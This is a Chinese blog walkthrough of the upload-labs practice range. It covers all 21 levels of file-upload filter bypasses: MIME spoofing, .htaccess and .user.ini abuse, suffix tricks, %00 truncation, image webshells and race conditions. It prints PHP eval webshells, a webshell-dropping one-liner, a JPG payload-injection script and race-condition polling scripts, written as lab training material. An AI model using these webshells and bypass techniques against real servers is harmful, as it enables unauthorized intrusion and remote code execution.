
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/DSchenzi/p/18939497" title="发布于 2025-06-21 00:28">
    <span role="heading" aria-level="2">upload-labs靶场通关教程</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="upload-labs靶场通关教程">upload-labs靶场通关教程</h1>
<h2 id="pass-01">Pass-01</h2>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002759453-54396459.png" alt="image-20250620165846989" loading="lazy"></p>
<p>我们先上传带有一句话木马的1.php</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002759896-267622490.png" alt="image-20250620170646729" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002800140-1317823806.png" alt="image-20250620170519343" loading="lazy"></p>
<p>查看页面源代码发现是前端js弹窗，我们直接禁用前端即可。</p>
<p>再进行上传1.php，我们就可以上传了。</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002800430-619777244.png" alt="image-20250620170956614" loading="lazy"></p>
<h2 id="pass-02">Pass-02</h2>
<p>做完每一题之后，我们最好清理一下上传的文件，以免对后续操作产生影响。</p>
<p>依旧上传1.php，但是发现不行</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002800736-1785389283.png" alt="image-20250620171457511" loading="lazy"></p>
<p>我们抓包，将content-Type改成image/png，再次上传发现成功上传</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002801054-2006458745.png" alt="image-20250620171619665" loading="lazy"></p>
<p>从源码上的角度去看</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002801344-1805639867.png" alt="image-20250620171815208" loading="lazy"></p>
<p>只判断了file的type的值，就可以绕过了</p>
<h2 id="pass-03">Pass-03</h2>
<p>依旧先上传1.php</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002801613-85811893.png" alt="image-20250620172113364" loading="lazy"></p>
<p>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件</p>
<p>我们只需要上传.phtml就可以绕过，上传</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002801881-1558100999.png" alt="image-20250620172328768" loading="lazy"></p>
<p>从源码上看</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002802150-333465571.png" alt="image-20250620172354711" loading="lazy"></p>
<p>这里只对后缀进行了限制，并没有对content-type，所以我们可以原封不动</p>
<h2 id="pass-04">Pass-04</h2>
<p>之后过滤的会越来越多，因为是靶场，我们可以直接从源码入手</p>
<p>关键过滤代码为</p>
<pre><code class="language-php">$deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
</code></pre>
<p>过滤了非常多，但仔细发现并没有过滤.htaccess文件</p>
<p>我们可以先上传.htaccess文件</p>
<pre><code class="language-php">AddType application/x-httpd-php .jpg .txt .png
</code></pre>
<p>再去上传1.png，内容为一句话木马</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002802557-2144351257.png" alt="image-20250620172937743" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002802833-1708947121.png" alt="image-20250620172926440" loading="lazy"></p>
<h2 id="pass-05">Pass-05</h2>
<p>关键过滤代码为</p>
<pre><code class="language-php">$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
</code></pre>
<p>这里过滤了上一题的.htaccess但没有过滤.user.ini</p>
<pre><code class="language-php">auto_prepend_file=1.jpg
</code></pre>
<p>然后再去上传1.jpg</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002803091-1765809530.png" alt="image-20250620173508478" loading="lazy"></p>
<h2 id="pass-06">Pass-06</h2>
<p>直接看源码</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002803483-1208390810.png" alt="image-20250620175706470" loading="lazy"></p>
<p>可以发现少了一行转小写的代码，那我们直接大小写绕过</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002803763-1817589603.png" alt="image-20250620175752608" loading="lazy"></p>
<p>放包即可上传</p>
<h2 id="pass-07">Pass-07</h2>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002804051-523643776.png" alt="image-20250620180819770" loading="lazy"></p>
<p>这关源码删去了trim()函数，也就是用来去除字符串两端的空格，所以我们如果在上传文件的后缀名里面加上空格，不属于黑名单内容，我们就可以成功进行上传</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002804380-531222922.png" alt="image-20250620180901553" loading="lazy"></p>
<p>放包上传即可</p>
<h2 id="pass-08">Pass-08</h2>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002804661-974329284.png" alt="image-20250620184011862" loading="lazy"></p>
<p>可以看到没有使用deldot()过滤文件名末尾的点，可以使用文件名后加 .进行绕过，即1.php.</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002804946-1939463916.png" alt="image-20250620184348722" loading="lazy"></p>
<h2 id="pass-09">Pass-09</h2>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002805256-1367848393.png" alt="image-20250620184429359" loading="lazy"></p>
<p>缺少了</p>
<pre><code class="language-php">$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
</code></pre>
<p>php在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持"::$DATA"之前的文件名 他的目的就是不检查后缀名。</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002805533-660716780.png" alt="image-20250620184714890" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002805815-315642968.png" alt="image-20250620184801895" loading="lazy"></p>
<p>注意这里url中要删掉最后的::$DATA</p>
<h2 id="pass-10">Pass-10</h2>
<p>使用 <code>deldot()</code> 删除文件名末尾的点</p>
<blockquote>
<p>deldot() 函数从末尾向前检测，检测到第一个点后，会继续向前检测，但遇到空格会停下来</p>
</blockquote>
<p>可以构造文件名：<code>1.php. .</code>绕过检测</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002806076-1882606760.png" alt="image-20250620185204669" loading="lazy"></p>
<p>url中依旧是去掉后面的字符，保留到1.php</p>
<h2 id="pass-11">Pass-11</h2>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002806375-1452718115.png" alt="image-20250620185346930" loading="lazy"></p>
<p>查看源码我们可以发现他仅仅对文件名称进行了替换，替换之后的后缀没有进行黑名单验证，这里我们就可以使用<strong>双写文件后缀</strong>进行文件上传</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002806688-749732888.png" alt="image-20250620185445069" loading="lazy"></p>
<h2 id="pass-12">Pass-12</h2>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002806965-1345793912.png" alt="image-20250620185617169" loading="lazy"></p>
<p>这一关白名单，通过%00截断可绕过白名单限制，但需确保PHP版本低于5.3.4且magic_quotes_gpc已关闭。</p>
<p>原理简述：PHP函数如move_uploaded_file在底层C语言实现时，会因遇到0x00（URL编码为%00）截断字符串。利用此特性，可绕过某些文件上传限制。</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002807240-1311270337.png" alt="image-20250620185825092" loading="lazy"></p>
<p>即可上传成功</p>
<pre><code class="language-php">代码分析：
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}

知识补充：
php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。
strrpos(string,find[,start]) 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。
substr(string,start[,length])函数返回字符串的一部分(从start开始 [，长度为length])
magic_quotes_gpc 着重偏向数据库方面，是为了防止sql注入，但magic_quotes_gpc开启还会对$_REQUEST, $_GET,$_POST,$_COOKIE 输入的内容进行过滤
</code></pre>
<h2 id="pass-13">Pass-13</h2>
<p>第13题与12题思路一样使用白名单限制上传文件类型，但上传文件的存放路径可控，</p>
<pre><code class="language-php">$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
</code></pre>
<p>但因为是POST型，需要对%00进行解码或在16进制中修改，POST不会像GET那样对%00进行自动解码。</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002807516-1838354307.png" alt="image-20250620190253680" loading="lazy"></p>
<h2 id="pass-14">Pass-14</h2>
<p>本关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002807773-1423263117.png" alt="image-20250620190529013" loading="lazy"></p>
<p>使用 <code>图片马 + 文件包含</code> 绕过</p>
<pre><code class="language-php">补充：
Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG
Jpg图片文件包括2字节：FF D8。
Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。
Bmp图片文件包括2字节：42 4D。即为 BM
    
图片马制作：
在cmd里执行 **copy logo.jpg/b+test.php/a test.jpg**
#logo.jpg为任意图片；test.php 插入的木马文件；test.jpg 生成的图片木马
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002808278-1635777103.png" alt="image-20250620191131205" loading="lazy"></p>
<p>然后将test.png上传</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002808560-1253206373.png" alt="image-20250620191225787" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002808810-1757326077.png" alt="image-20250620191218441" loading="lazy"></p>
<p>再点击黄色的文件包含漏洞字眼</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002809082-338416208.png" alt="image-20250620191248125" loading="lazy"></p>
<p>然后打一个很简单的文件包含漏洞</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002809371-604358463.png" alt="image-20250620210102055" loading="lazy"></p>
<h2 id="pass-15">Pass-15</h2>
<p>使用getimagesize()检查是否为图片文件</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002809726-1494454795.png" alt="image-20250620210528883" loading="lazy"></p>
<pre><code class="language-php">getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。
主要是针对*.php直接更改文件后缀为图片后缀，上一题创建的图片马仍然可以使用。
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002810170-2021450977.png" alt="image-20250620210632725" loading="lazy"></p>
<h2 id="pass-16">Pass-16</h2>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002810448-1658398946.png" alt="image-20250620210719557" loading="lazy"></p>
<pre><code class="language-php">exif_imagetype()读取一个图像的第一个字节并检查其后缀名。
返回值与getimage()函数返回的索引2相同，但是速度比getimage快
</code></pre>
<p>方法同Pass-14</p>
<h2 id="pass-17">Pass-17</h2>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") &amp;&amp; ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
</code></pre>
<p>根据源码和题目提示可以得知这是一个二次渲染</p>
<p>上传的图片经过了后缀名、内容类型和imagecreatefromgif函数的严格验证，确保其为GIF格式。随后，图片经过了二次渲染处理。然而，在后端的二次渲染过程中，需要识别并标记出渲染后未发生改变的十六进制（Hex）区域。通过利用文件包含漏洞，可以在这些未变区域嵌入恶意代码，进而使用蚁剑工具进行远程连接和操作。</p>
<p>这里的二次渲染图片使用大菜鸡师傅的。</p>
<p>先上传一张原始jpg，然后直接下载二次渲染后的jpg</p>
<p>脚本如下：</p>
<pre><code class="language-php">&lt;?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php &lt;jpg_name.jpg&gt;

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */
		
    $miniPayload = "&lt;?=eval(\$_POST[7]);?&gt;"; //注意$转义


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php &lt;jpg_name.jpg&gt;');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad &lt; 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis-&gt;readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
            $marker = $dis-&gt;readByte();
            $size = $dis-&gt;readShort() - 2;
            $dis-&gt;skip($size);
            if($marker === 0xDA) {
                $startPos = $dis-&gt;seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis-&gt;eof())) {
                        if($dis-&gt;readByte() === 0xFF) {
                            if($dis-&gt;readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis-&gt;seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this-&gt;binData = '';
            $this-&gt;order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this-&gt;binData = file_get_contents($filename);
            } else {
                $this-&gt;binData = $filename;
            }
            $this-&gt;size = strlen($this-&gt;binData);
        }

        public function seek() {
            return ($this-&gt;size - strlen($this-&gt;binData));
        }

        public function skip($skip) {
            $this-&gt;binData = substr($this-&gt;binData, $skip);
        }

        public function readByte() {
            if($this-&gt;eof()) {
                die('End Of File');
            }
            $byte = substr($this-&gt;binData, 0, 1);
            $this-&gt;binData = substr($this-&gt;binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this-&gt;binData) &lt; 2) {
                die('End Of File');
            }
            $short = substr($this-&gt;binData, 0, 2);
            $this-&gt;binData = substr($this-&gt;binData, 2);
            if($this-&gt;order) {
                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
        }
    }
?&gt;
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002810745-755480538.png" alt="image-20250620231707237" loading="lazy"></p>
<p>得到一个以payload_开头的图片，然后上传即可</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002811061-1979982727.png" alt="image-20250620231749254" loading="lazy"></p>
<h2 id="pass-18">Pass-18</h2>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002811368-2026163769.png" alt="image-20250620232344393" loading="lazy"></p>
<p>通过分析源代码，仅仅只是判断文件名称，和修改上传的文件名称，如果临时文件的后缀不在黑名单里面，就删除这个临时文件，那么这个临时文件在没有删除之前执行我们上传的代码块呢。</p>
<p>这也就是条件竞争。</p>
<p>我们可以利用burp多线程发包，然后不断在浏览器访问我们的webshell，总会有一瞬间的访问成功。</p>
<p>这个页面中没有文件包含漏洞，图片马的漏洞利用条件就是文件包含。此时没有这个漏洞了，那么可以使用如下方法。</p>
<p>将一句话代码更改为如下内容。</p>
<pre><code class="language-php">&lt;?php fputs(fopen('shell.php', 'w'), '&lt;?php eval($_POST["a"]);?&gt;');?&gt;
</code></pre>
<p>使用Burp Suite连续重放PHP文件上传请求，同时用Python脚本频繁访问该文件。在文件被删除前访问成功，即可在目录下创建一个包含一句话木马的Tony.php。这种方法在渗透测试中有效，因为它避免了仅访问phpinfo()文件的局限性。生成的Tony.php不会被服务器自动删除，从而允许我们通过蚁剑进行连接。</p>
<p>首先，我们上传PHP文件，用BP拦截，并发送到攻击器Intruder</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002811644-898575066.png" alt="image-20250620232829213" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002811934-46937501.png" alt="image-20250620233157200" loading="lazy"></p>
<p>然后我们再写一个python脚本，通过它来不停的访问我们上传上去的php文件</p>
<pre><code class="language-python">import requests
def main():
    url='http://10.234.13.155/upload-labs/upload/tmp.php'
    while True:
        res = requests.get(url)
        print('未找到php文件')
        if res.status_code == 200:
            print('over!')
            break
 
if __name__ == '__main__':
    main()
</code></pre>
<p>在BP攻击的同时我们也要运行python脚本，目的就是不停地访问<code>tmp.php</code>知道成功访问到为止。当出现OK说明访问到了该文件，那么<code>shell.php</code>应该也创建成功了，用蚁剑连一下试试。</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002812479-1064255001.png" alt="image-20250620234544130" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002812904-1901276424.png" alt="image-20250620234630105" loading="lazy"></p>
<h2 id="pass-19">Pass-19</h2>
<p>从源码来看的话，服务器先是将文件后缀跟白名单做了对比，然后检查了文件大小以及文件是否已经存在。文件上传之后又对其进行了重命名。</p>
<p>这么看来的话，php是不能上传了，只能上传图片马了，而且需要在图片马没有被重命名之前访问它。要让图片马能够执行还要配合其他漏洞，比如文件包含，apache解析漏洞等。</p>
<p>一句话木马依旧是</p>
<pre><code class="language-php">&lt;?php fputs(fopen('shell.php', 'w'), '&lt;?php eval($_POST["a"]);?&gt;');?&gt;
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002813155-1411302907.png" alt="image-20250621000115007" loading="lazy"></p>
<pre><code class="language-python">import requests
def main():
    url='http://10.234.13.155/upload-labs/upload/1.png'
    while True:
        res = requests.get(url)
        print('未找到png文件')
        if res.status_code == 200:
            print('over!')
            break
 
if __name__ == '__main__':
    main()
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002813503-1270359003.png" alt="image-20250621000105500" loading="lazy"></p>
<h2 id="pass-20">Pass-20</h2>
<p>黑名单过滤</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002813810-303430746.png" alt="image-20250621001154906" loading="lazy"></p>
<p>在php中move_uploaded_file有一个特性<br>
修改上传文件名称为<code>upload-19.php/.</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002814076-1185629233.png" alt="image-20250621001319494" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002814321-925618592.png" alt="image-20250621001334116" loading="lazy"></p>
<h2 id="pass-21">Pass-21</h2>
<pre><code class="language-php">if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}
</code></pre>
<p>源码逻辑：</p>
<ol>
<li>检查MIME （通过抓包改Content-Type 绕过）</li>
<li>判断 POST参数 save_name 是否为空，</li>
<li>判断$file 是否为数组，不是数组以 <code>.</code>分割化为数组</li>
<li>取 $file 最后一个元素，作为文件后缀进行检查</li>
<li>取 $file 第一位和第<code>$file[count($file) - 1]</code>作为文件名和后缀名保存文件</li>
</ol>
<pre><code class="language-php">修改content-type 修改POST参数为数组类型，
索引[0]为1.php
索引[2]为jpg|png|gif 
只要第二个索引不为1，
$file[count($file) - 1]就等价于$file[2-1]，值为空绕过
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202506/3588329-20250621002814567-32900150.png" alt="image-20250621002344527" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2025-06-21 00:29">2025-06-21 00:28</span>&nbsp;
<a href="https://www.cnblogs.com/DSchenzi">dynasty_chenzi</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18939497);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18939497', targetLink: 'https://www.cnblogs.com/DSchenzi/p/18939497', title: 'upload-labs靶场通关教程' })">举报</a>
</div>
        